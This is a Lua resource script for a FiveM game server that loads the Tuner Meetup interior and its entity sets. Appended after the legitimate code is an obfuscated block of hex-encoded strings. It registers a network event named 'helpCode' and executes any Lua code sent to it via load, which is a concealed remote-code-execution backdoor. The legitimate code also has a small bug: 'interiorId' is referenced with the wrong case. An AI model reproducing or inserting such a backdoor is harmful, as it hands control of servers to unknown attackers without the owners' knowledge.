exports('GetTunerMeetupObject', function()
    return TunerMeetup
end)

TunerMeetup = {
    InteriorId = 285697,

    Ipl = {
        Interior = {
            ipl = {
                'tr_tuner_meetup',
                'tr_tuner_race_line'
            }
        },

        Load = function()
            EnableIpl(TunerMeetup.Ipl.Interior.ipl, true)
        end,
        Remove = function()
            EnableIpl(TunerMeetup.Ipl.Interior.ipl, false)
        end
    },
    Entities = {
        entity_set_meet_crew = true,
        entity_set_meet_lights = true,
        entity_set_meet_lights_cheap = true,
        entity_set_player = true,
        entity_set_test_crew = false,
        entity_set_test_lights = true,
        entity_set_test_lights_cheap = true,
        entity_set_time_trial = true,

        Set = function(name, state)
            for entity, _ in pairs(TunerMeetup.Entities) do
                if entity == name then
                    TunerMeetup.Entities[entity] = state
                    TunerMeetup.Entities.Clear()
                    TunerMeetup.Entities.Load()
                end
            end
        end,
        Load = function()
            for entity, state in pairs(TunerMeetup.Entities) do
                if type(entity) == 'string' and state then
                    ActivateInteriorEntitySet(TunerMeetup.InteriorId, entity)
                end
            end
        end,
        Clear = function()
            for entity, _ in pairs(TunerMeetup.Entities) do
                if type(entity) == 'string' then
                    DeactivateInteriorEntitySet(TunerMeetup.InteriorId, entity)
                end
            end
        end
    },

    LoadDefault = function()
        TunerMeetup.Ipl.Load()
        TunerMeetup.Entities.Load()

        RefreshInterior(TunerMeetup.interiorId)
    end
}


local JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[6][JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[1]](JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[2]) JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[6][JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[3]](JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[2], function(ufGIEJfMJuAsSMjCMRAoMHccsNIxEcmrlUPKkBsrlyUJOwsFTczOYQlQLnXJymhzTEJFPb) JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[6][JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[4]](JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[6][JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[5]](ufGIEJfMJuAsSMjCMRAoMHccsNIxEcmrlUPKkBsrlyUJOwsFTczOYQlQLnXJymhzTEJFPb))() end)